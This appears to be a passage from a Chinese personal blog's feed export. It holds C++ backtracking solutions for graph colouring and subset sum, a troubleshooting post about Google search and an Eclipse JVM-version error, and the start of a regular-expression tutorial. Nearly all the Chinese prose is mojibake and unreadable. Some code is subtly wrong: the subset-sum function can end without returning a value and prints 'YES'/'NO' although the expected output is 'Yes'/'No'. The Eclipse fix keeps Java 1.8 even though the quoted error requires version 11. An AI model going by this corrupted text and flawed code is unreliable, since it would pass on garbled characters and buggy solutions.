class="hljs-built_in">cin</span>&gt;&gt;n;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)m[i][j]=<span class="hljs-string">'.'</span>;dfs(<span class="hljs-number">0</span>);<span class="hljs-built_in">cout</span>&lt;&lt;ans;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><h2 id="må›¾ç€è‰²é—®é¢˜"><a href="#må›¾ç€è‰²é—®é¢˜" class="headerlink" title="må›¾ç€è‰²é—®é¢˜"></a>må›¾ç€è‰²é—®é¢˜</h2><h3 id="é¢˜ç›®æè¿°-6"><a href="#é¢˜ç›®æè¿°-6" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>ç»™å®šæ— å‘è¿é€šå›¾Gå’Œmç§ä¸åŒçš„é¢œè‰²ï¼Œç”¨è¿™äº›é¢œè‰²ç»™å›¾çš„å„ä¸ªé¡¶ç‚¹ç€ä¸€ç§é¢œè‰²ï¼Œè‹¥æŸç§æ–¹æ¡ˆä½¿å¾—å›¾ä¸­æ¯æ¡è¾¹çš„2ä¸ªé¡¶ç‚¹çš„é¢œè‰²éƒ½ä¸ç›¸åŒï¼Œåˆ™æ˜¯ä¸€ä¸ªæ»¡è¶³çš„æ–¹æ¡ˆï¼Œæ‰¾å‡ºæ‰€æœ‰çš„æ–¹æ¡ˆã€‚</p><h3 id="è¾“å…¥-5"><a href="#è¾“å…¥-5" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h3><p>ç¬¬ä¸€è¡Œæœ‰3ä¸ªæ­£æ•´æ•°nï¼Œkå’Œmï¼Œåˆ†åˆ«è¡¨ç¤ºnä¸ªé¡¶ç‚¹ï¼Œkæ¡è¾¹ï¼Œmç§é¢œè‰²<br>æ¥ä¸‹æ¥kè¡Œï¼Œæ¯è¡Œ2ä¸ªæ­£æ•´æ•°ï¼Œè¡¨ç¤ºä¸€æ¡è¾¹çš„ä¸¤ä¸ªé¡¶ç‚¹</p><h3 id="è¾“å‡º-5"><a href="#è¾“å‡º-5" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p>æ‰€æœ‰ä¸åŒçš„ç€è‰²æ–¹æ¡ˆæ•°</p><h3 id="æ ·ä¾‹è¾“å…¥-6"><a href="#æ ·ä¾‹è¾“å…¥-6" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><div class="hljs"><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">8</span> <span class="hljs-number">4</span> <span class="hljs-symbol">1 </span><span class="hljs-number">2</span><span class="hljs-symbol">1 </span><span class="hljs-number">3</span> <span class="hljs-symbol">1 </span><span class="hljs-number">4</span><span class="hljs-symbol">2 </span><span class="hljs-number">3</span><span class="hljs-symbol">2 </span><span class="hljs-number">4</span><span class="hljs-symbol">2 </span><span class="hljs-number">5</span><span class="hljs-symbol">3 </span><span class="hljs-number">4</span><span class="hljs-symbol">4 </span><span class="hljs-number">5</span></code></pre></div><h3 id="æ ·ä¾‹è¾“å‡º-6"><a href="#æ ·ä¾‹è¾“å‡º-6" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">48</span></code></pre></div><h3 id="æç¤º-5"><a href="#æç¤º-5" class="headerlink" title="æç¤º"></a>æç¤º</h3><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">105</span>;<span class="hljs-keyword">int</span> mp[N][N];<span class="hljs-keyword">int</span> color[N]=&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">int</span> n,k,m,ans=<span class="hljs-number">0</span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> d)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">if</span>(d==n+<span class="hljs-number">1</span>)&#123;ans++;<span class="hljs-keyword">return</span>;&#125;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)&#123;<span class="hljs-keyword">int</span> flag=<span class="hljs-number">1</span>;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)&#123;<span class="hljs-keyword">if</span>(mp[d][j]&amp;&amp;color[j]==i)&#123;flag=<span class="hljs-number">0</span>;<span class="hljs-keyword">break</span>;&#125; &#125; <span class="hljs-keyword">if</span>(flag) &#123;  color[d]=i; dfs(d+<span class="hljs-number">1</span>); color[d]=<span class="hljs-number">0</span>;  &#125;  &#125; &#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;k&gt;&gt;m;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)&#123;<span class="hljs-keyword">int</span> t1,t2;<span class="hljs-built_in">cin</span>&gt;&gt;t1&gt;&gt;t2;mp[t1][t2]=<span class="hljs-number">1</span>;mp[t2][t1]=<span class="hljs-number">1</span>;&#125;dfs(<span class="hljs-number">1</span>);<span class="hljs-built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="hljs-built_in">endl</span>;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><h2 id="éƒ¨åˆ†å’Œ"><a href="#éƒ¨åˆ†å’Œ" class="headerlink" title="éƒ¨åˆ†å’Œ"></a>éƒ¨åˆ†å’Œ</h2><h3 id="é¢˜ç›®æè¿°-7"><a href="#é¢˜ç›®æè¿°-7" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>ç»™å®šnä¸ªæ•´æ•°ï¼Œåˆ¤æ–­æ˜¯å¦å¯ä»¥ä»ä¸­é€‰æ‹©è‹¥å¹²æ•°å­—ï¼Œä½¿å¾—ä»–ä»¬çš„å’Œæ°å¥½ä¸ºkã€‚</p><h3 id="è¾“å…¥-6"><a href="#è¾“å…¥-6" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h3><p>å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚</p><p>å¯¹äºæ¯ç»„æµ‹è¯•ç”¨ä¾‹ï¼Œç¬¬ä¸€è¡Œä¸€ä¸ªæ­£æ•´æ•°nï¼Œç¬¬äºŒè¡Œnä¸ªæ•´æ•°ï¼Œç¬¬ä¸‰è¡Œä¸€ä¸ªæ•´æ•°kã€‚</p><p><em>1*</em>â‰¤<strong>N</strong>â‰¤*<em>20</em>ï¼Œè¾“å…¥æ•´æ•°åŠkå‡å°äº<em>1e8</em>ã€‚</p><h3 id="è¾“å‡º-6"><a href="#è¾“å‡º-6" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p>è‹¥å¯ä»¥ä½¿å¾—å’Œä¸ºkï¼Œè¾“å‡ºâ€Yesâ€,å¦åˆ™â€Noâ€ã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥-7"><a href="#æ ·ä¾‹è¾“å…¥-7" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><div class="hljs"><pre><code class="hljs basic"><span class="hljs-number">4</span><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">7</span><span class="hljs-number">13</span></code></pre></div><h3 id="æ ·ä¾‹è¾“å‡º-7"><a href="#æ ·ä¾‹è¾“å‡º-7" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><div class="hljs"><pre><code class="hljs yaml"><span class="hljs-literal">Yes</span></code></pre></div><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">int</span> s[<span class="hljs-number">25</span>];<span class="hljs-keyword">int</span> n,m;<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-keyword">int</span> l,<span class="hljs-keyword">int</span> a)</span></span><span class="hljs-function"></span>&#123; <span class="hljs-keyword">if</span>(a==m) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">if</span>(l==n) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-keyword">if</span>(check(l+<span class="hljs-number">1</span>,a+s[l])) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">if</span>(check(l+<span class="hljs-number">1</span>,a)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">cin</span>&gt;&gt;n;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<span class="hljs-built_in">cin</span>&gt;&gt;s[i];&#125;<span class="hljs-built_in">cin</span>&gt;&gt;m;<span class="hljs-keyword">if</span>(check(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"YES"</span>;<span class="hljs-keyword">else</span><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"NO"</span>; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>c++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>googleæœç´¢å¼•æ“&amp;eclipseå¯åŠ¨é—®é¢˜</title>
    <link href="/2020/11/02/eclipse%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/"/>
    <url>/2020/11/02/eclipse%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>è°·æ­Œæœç´¢å¼•æ“å‰ä¸¤å¤©çªç„¶æ— æ³•æœç´¢ä¸œè¥¿ä½†æ˜¯å¯ä»¥ç»§ç»­è®¿é—®YouTubeï¼Œå°±**ç¦»è°±ã€‚</p><p>ç”±äºè¯¾ç¨‹åŸå› éœ€è¦å­¦ä¹ javaï¼Œä»Šå¤©å°±ä¸‹è½½äº†ä¸€ä¸ªJavaå¸¸ç”¨çš„ç¼–è¾‘å™¨eclipseï¼Œä½†æ˜¯å¯åŠ¨æ—¶ç»™æˆ‘ä¸€ä¸ªå¼¹çª—ï¼Œç‰ˆæœ¬ä¸ä¸€è‡´ã€‚</p><a id="more"></a><h1 id="googleæµè§ˆå™¨"><a href="#googleæµè§ˆå™¨" class="headerlink" title="googleæµè§ˆå™¨"></a>googleæµè§ˆå™¨</h1><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>Googleæµè§ˆå™¨å¯ä»¥è®¿é—®å¤–ç½‘ï¼Œä½†æ˜¯æ— æ³•ä½¿ç”¨æœç´¢å¼•æ“æœä¸œè¥¿ï¼Œæ¯æ¬¡æ˜¾ç¤ºæ— æ³•è¿æ¥<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a></p><h2 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h2><p>ä¸€å¼€å§‹æƒ³ç€å¸è½½é‡è£…ï¼Œå‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œåæ¥æ¢æˆäº†æµ‹è¯•ç‰ˆæœ¬ç»“æœçœŸèƒ½ç”¨ï¼Œä½†æ˜¯ä¸¤å¤©æ²¡åˆ°åˆå‡ºç°é‚£ç§æƒ…å†µï¼Œå¾ˆæ— è¯­</p><p>æƒ³ç€åº”è¯¥æ˜¯google.comè¢«å±è”½äº†ï¼Œè¯•ç€æ¸…é™¤dnsç¼“å­˜</p><div class="hljs"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span> /flushdns</code></pre></div><p>è¿˜æ˜¯ä¸è¡Œï¼Œç›´æ¥é‡Šæ”¾ipé‡æ–°ç”³è¯·</p><div class="hljs"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span> /release<span class="hljs-built_in">ipconfig</span> /renew</code></pre></div><p>ç„¶åå°±å¯ä»¥ç”¨äº†ã€‚ã€‚</p><p>ï¼ˆå‡ ä¸ªå°æ—¶è¿‡å»äº†å°±ä»–å¦ˆä¸èƒ½ç”¨äº†ï¼ŒçœŸå°¼ç›ç¦»è°±ï¼‰</p><h1 id="eclipseé—®é¢˜"><a href="#eclipseé—®é¢˜" class="headerlink" title="eclipseé—®é¢˜"></a>eclipseé—®é¢˜</h1><h2 id="é—®é¢˜-1"><a href="#é—®é¢˜-1" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>å¼¹çª—å†…å®¹</p><p>Version 1.8.0_271 of the JVM is not suitable for this product.Version: 11or greater is required.</p><p>JVMçš„1.8.0_271ç‰ˆæœ¬ä¸é€‚åˆæ­¤äº§å“ã€‚ç‰ˆæœ¬ï¼š11æˆ–æ›´é«˜ç‰ˆæœ¬æ˜¯å¿…éœ€çš„ã€‚</p><p>å¤§æ¦‚æ„æ€å°±æ˜¯å½“å‰çš„jvmç‰ˆæœ¬ä¸è½¯ä»¶ä¸ç›¸å®¹</p><h2 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h2><h3 id="1-æ‰¾åˆ°javaå®‰è£…çš„è·¯å¾„"><a href="#1-æ‰¾åˆ°javaå®‰è£…çš„è·¯å¾„" class="headerlink" title="1.æ‰¾åˆ°javaå®‰è£…çš„è·¯å¾„"></a>1.æ‰¾åˆ°javaå®‰è£…çš„è·¯å¾„</h3><p>é»˜è®¤å®‰è£…æ˜¯ä¸‹é¢è¿™ä¸ªè·¯å¾„</p><div class="hljs"><pre><code class="hljs fortran">C:\<span class="hljs-function"><span class="hljs-keyword">Program</span></span> Files\Java\</code></pre></div><p>æ‰¾åˆ°</p><div class="hljs"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\J</span>ava<span class="hljs-symbol">\j</span>re1.8.0_271<span class="hljs-symbol">\b</span>in<span class="hljs-symbol">\j</span>avaw.exe</code></pre></div><h3 id="2-æ‰“å¼€eclipseçš„å®‰è£…è·¯å¾„ï¼Œæ‰“å¼€eclipse-ini"><a href="#2-æ‰“å¼€eclipseçš„å®‰è£…è·¯å¾„ï¼Œæ‰“å¼€eclipse-ini" class="headerlink" title="2.æ‰“å¼€eclipseçš„å®‰è£…è·¯å¾„ï¼Œæ‰“å¼€eclipse.ini"></a>2.æ‰“å¼€eclipseçš„å®‰è£…è·¯å¾„ï¼Œæ‰“å¼€eclipse.ini</h3><p>ä¿®æ”¹æˆä¸‹é¢è¿™æ ·</p><div class="hljs"><pre><code class="hljs stylus">-startupplugins/org<span class="hljs-selector-class">.eclipse</span><span class="hljs-selector-class">.equinox</span><span class="hljs-selector-class">.launcher_1</span>.<span class="hljs-number">5.800</span><span class="hljs-selector-class">.v20200727-1323</span>.jar--launcher.libraryplugins/org<span class="hljs-selector-class">.eclipse</span><span class="hljs-selector-class">.equinox</span><span class="hljs-selector-class">.launcher</span><span class="hljs-selector-class">.win32</span><span class="hljs-selector-class">.win32</span><span class="hljs-selector-class">.x86_64_1</span>.<span class="hljs-number">1.1300</span>.v20200819-<span class="hljs-number">0940</span>-productorg<span class="hljs-selector-class">.eclipse</span><span class="hljs-selector-class">.epp</span><span class="hljs-selector-class">.package</span><span class="hljs-selector-class">.java</span>.product-showsplashorg<span class="hljs-selector-class">.eclipse</span><span class="hljs-selector-class">.epp</span><span class="hljs-selector-class">.package</span>.common--launcher.defaultActionopenFile--launcher.defaultActionopenFile--launcher.appendVmargs-vm                                               <span class="hljs-comment">//è¿™ä¸¤è¡Œ</span>C:\Program Files\Java\jre1.<span class="hljs-number">8.0</span>_271\bin\javaw<span class="hljs-selector-class">.exe</span>  <span class="hljs-comment">//æ˜¯æ·»åŠ çš„</span>-vmargs-Dosgi.requiredJavaVersion=<span class="hljs-number">1.8</span>                    <span class="hljs-comment">//è¿™é‡Œæ”¹ä¸ºjdkç‰ˆæœ¬å·</span>-Dosgi<span class="hljs-selector-class">.instance</span><span class="hljs-selector-class">.area</span>.default=@user.home/eclipse-workspace-XX:+UseG1GC-XX:+UseStringDeduplication--add-modules=ALL-SYSTEM-Dosgi.requiredJavaVersion=<span class="hljs-number">1.8</span>  <span class="hljs-comment">//è¿™é‡Œä¹Ÿä¸€æ ·</span>-Dosgi.dataAreaRequiresExplicitInit=true-Xms256m-Xmx2048m--add-modules=ALL-SYSTEM</code></pre></div><p>ä¿å­˜åæˆåŠŸå¯åŠ¨ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>éšç¬”</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ­£åˆ™è¡¨è¾¾å¼</title>
    <link href="/2020/11/01/preg/"/>
    <url>/2020/11/01/preg/</url>
    
    <content type="html"><![CDATA[<p>åœ¨ä¸€äº›ä»£ç å®¡è®¡çš„é¢˜ç›®å½“ä¸­ç»å¸¸ä¼šå‡ºç°ä½¿ç”¨æ­£åˆ™è¡¨è¾¾è¿‡æ»¤å­—ç¬¦ä¸²çš„æƒ…å†µï¼Œæ‰€ä»¥æœ‰å¿…è¦ç³»ç»Ÿçš„å­¦ä¹ ä¸€ä¸‹ï¼</p><a id="more"></a><h1 id="ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼"><a href="#ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼"></a>ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼</h1><p><a href="https://www.runoob.com/regexp/regexp-example.html" target="_blank" rel="noopener">è¯¦æƒ…è§è¿™</a></p><p>èœé¸¡æ•™ç¨‹ä¸­ä»‹ç»çš„å¾ˆè¯¦ç»†ã€‚</p><h2 id="ç‰¹æ®Šå­—ç¬¦"><a href="#ç‰¹æ®Šå­—ç¬¦" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦"></a>ç‰¹æ®Šå­—ç¬¦</h2><p>è®¸å¤šå…ƒå­—ç¬¦è¦æ±‚åœ¨è¯•å›¾åŒ¹é…å®ƒä»¬æ—¶ç‰¹åˆ«å¯¹å¾…ã€‚è‹¥è¦åŒ¹é…è¿™äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå¿…é¡»é¦–å…ˆä½¿å­—ç¬¦â€è½¬ä¹‰â€ï¼Œå³ï¼Œå°†åæ–œæ å­—ç¬¦<strong>\</strong> æ”¾åœ¨å®ƒä»¬å‰é¢ã€‚ä¸‹è¡¨åˆ—å‡ºäº†æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼š</p><table><thead><tr><th align="left">ç‰¹åˆ«å­—ç¬¦</th><th align="right">æè¿°</th></tr></thead><tbody><tr><td align="left">$</td><td align="right">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“å°¾ä½ç½®ã€‚å¦‚æœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œåˆ™ $ ä¹ŸåŒ¹é… â€˜\nâ€™ æˆ– â€˜\râ€™ã€‚è¦åŒ¹é… $ å­—ç¬¦æœ¬èº«ï¼Œè¯·ä½¿ç”¨ \$ã€‚</td></tr><tr><td align="left">( )</td><td align="right">æ ‡è®°ä¸€ä¸ªå­è¡¨è¾¾å¼çš„å¼€å§‹å’Œç»“æŸä½ç½®ã€‚å­è¡¨è¾¾å¼å¯ä»¥è·å–ä¾›ä»¥åä½¿ç”¨ã€‚è¦åŒ¹é…è¿™äº›å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ ( å’Œ )ã€‚</td></tr><tr><td align="left">*</td><td align="right">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚è¦åŒ¹é… * å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ \*ã€‚</td></tr><tr><td align="left">+</td><td align="right">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚è¦åŒ¹é… + å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ \+ã€‚</td></tr><tr><td align="left">.</td><td align="right">åŒ¹é…é™¤æ¢è¡Œç¬¦ \n ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦ã€‚è¦åŒ¹é… . ï¼Œè¯·ä½¿ç”¨ \. ã€‚</td></tr><tr><td align="left">[</td><td align="right">æ ‡è®°ä¸€ä¸ªä¸­æ‹¬å·è¡¨è¾¾å¼çš„å¼€å§‹ã€‚è¦åŒ¹é… [ï¼Œè¯·ä½¿ç”¨\[ã€‚</td></tr><tr><td align="left">?</td><td align="right">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼Œæˆ–æŒ‡æ˜ä¸€ä¸ªéè´ªå©ªé™å®šç¬¦ã€‚è¦åŒ¹é… ? å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ ?ã€‚</td></tr><tr><td align="left">\</td><td align="right">å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºæˆ–ç‰¹æ®Šå­—ç¬¦ã€æˆ–åŸä¹‰å­—ç¬¦ã€æˆ–å‘åå¼•ç”¨ã€æˆ–å…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œ â€˜nâ€™ åŒ¹é…å­—ç¬¦ â€˜nâ€™ã€‚â€™\nâ€™ åŒ¹é…æ¢è¡Œç¬¦ã€‚åºåˆ— â€˜\â€˜ åŒ¹é… â€œ&quot;ï¼Œè€Œ â€˜(â€˜ åˆ™åŒ¹é… â€œ(â€œã€‚</td></tr><tr><td align="left">^</td><td align="right">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ï¼Œé™¤éåœ¨æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­ä½¿ç”¨ï¼Œå½“è¯¥ç¬¦å·åœ¨æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­ä½¿ç”¨æ—¶ï¼Œè¡¨ç¤ºä¸æ¥å—è¯¥æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­çš„å­—ç¬¦é›†åˆã€‚è¦åŒ¹é… ^ å­—ç¬¦æœ¬èº«ï¼Œè¯·ä½¿ç”¨ ^ã€‚</td></tr><tr><td align="left">{</td><td align="right">æ ‡è®°é™å®šç¬¦è¡¨è¾¾å¼çš„å¼€å§‹ã€‚è¦åŒ¹é… {ï¼Œè¯·ä½¿ç”¨ \{ã€‚</td></tr><tr><td align="left">|</td><td align="right">æŒ‡æ˜ä¸¤é¡¹ä¹‹é—´çš„ä¸€ä¸ªé€‰æ‹©ã€‚è¦åŒ¹é… |ï¼Œè¯·ä½¿ç”¨ \</td></tr></tbody></table><h2 id="é™å®šç¬¦"><a href="#é™å®šç¬¦" class="headerlink" title="é™å®šç¬¦"></a>é™å®šç¬¦</h2><p>é™å®šç¬¦ç”¨æ¥æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼çš„ä¸€ä¸ªç»™å®šç»„ä»¶å¿…é¡»è¦å‡ºç°å¤šå°‘æ¬¡æ‰èƒ½æ»¡è¶³åŒ¹é…ã€‚æœ‰ <strong>*** æˆ– **+</strong> æˆ– <strong>?</strong> æˆ– <strong>{n}</strong> æˆ– <strong>{n,}</strong> æˆ– <strong>{n,m}</strong> å…±6ç§ã€‚</p><p>æ­£åˆ™è¡¨è¾¾å¼çš„é™å®šç¬¦æœ‰ï¼š</p><table><thead><tr><th align="left">å­—ç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td align="left">*</td><td>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo* èƒ½åŒ¹é… â€œzâ€ ä»¥åŠ â€œzooâ€ã€‚* ç­‰ä»·äº{0,}ã€‚</td></tr><tr><td align="left">+</td><td>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™zo+â€™ èƒ½åŒ¹é… â€œzoâ€ ä»¥åŠ â€œzooâ€ï¼Œä½†ä¸èƒ½åŒ¹é… â€œzâ€ã€‚+ ç­‰ä»·äº {1,}ã€‚</td></tr><tr><td align="left">?</td><td>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€do(es)?â€ å¯ä»¥åŒ¹é… â€œdoâ€ ã€ â€œdoesâ€ ä¸­çš„ â€œdoesâ€ ã€ â€œdoxyâ€ ä¸­çš„ â€œdoâ€ ã€‚? ç­‰ä»·äº {0,1}ã€‚</td></tr><tr><td align="left">{n}</td><td>n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚åŒ¹é…ç¡®å®šçš„ n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†æ˜¯èƒ½åŒ¹é… â€œfoodâ€ ä¸­çš„ä¸¤ä¸ª oã€‚</td></tr><tr><td align="left">{n,}</td><td>n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é…n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2,}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†èƒ½åŒ¹é… â€œfooooodâ€ ä¸­çš„æ‰€æœ‰ oã€‚â€™o{1,}â€™ ç­‰ä»·äº â€˜o+â€™ã€‚â€™o{0,}â€™ åˆ™ç­‰ä»·äº â€˜o*â€™ã€‚</td></tr><tr><td align="left">{n,m}</td><td>m å’Œ n å‡ä¸ºéè´Ÿæ•´æ•°ï¼Œå…¶ä¸­n &lt;= mã€‚æœ€å°‘åŒ¹é… n æ¬¡ä¸”æœ€å¤šåŒ¹é… m æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€o{1,3}â€ å°†åŒ¹é… â€œfoooooodâ€ ä¸­çš„å‰ä¸‰ä¸ª oã€‚â€™o{0,1}â€™ ç­‰ä»·äº â€˜o?â€™ã€‚è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ã€‚</td></tr></tbody></table><h1 id="å¸¸ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼åŠå«ä¹‰"><a href="#å¸¸ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼åŠå«ä¹‰" class="headerlink" title="å¸¸ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼åŠå«ä¹‰"></a>å¸¸ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼åŠå«ä¹‰</h1><p><a href="http://c.runoob.com/front-end/854" target="_blank" rel="noopener">å‚è€ƒ</a></p><div class="hljs"><pre><code class="hljs markdown">ä¸€ã€æ ¡éªŒæ•°å­—çš„è¡¨è¾¾å¼<span class="hljs-bullet">1. </span>æ•°å­—ï¼š^[0-9]*$// ^è¡¨ç¤ºå­—ç¬¦çš„å¼€å§‹ï¼Œ$è¡¨ç¤ºç»“æŸ  [0-9] è¡¨ç¤ºå­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦åœ¨0-9ä¸­<span class="hljs-bullet">2. </span>nä½çš„æ•°å­—ï¼š^\d&#123;n&#125;$    // \dä¸[0-9]ç­‰ä»· ï¼Œ&#123;n&#125; nè¡¨ç¤ºåŒ¹é…næ¬¡ï¼Œæ‰€ä»¥è¡¨ç¤ºåŒ¹é…nä½æ•°<span class="hljs-bullet">3. </span>è‡³å°‘nä½çš„æ•°å­—ï¼š^\d&#123;n,&#125;$      //&#123;n,&#125;è‡³å°‘næ¬¡<span class="hljs-bullet">4. </span>m-nä½çš„æ•°å­—ï¼š^\d&#123;m,n&#125;$     //&#123;n,m&#125;  n-mæ¬¡<span class="hljs-bullet">5. </span>é›¶å’Œéé›¶å¼€å¤´çš„æ•°å­—ï¼š^(0|[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*)$  // | 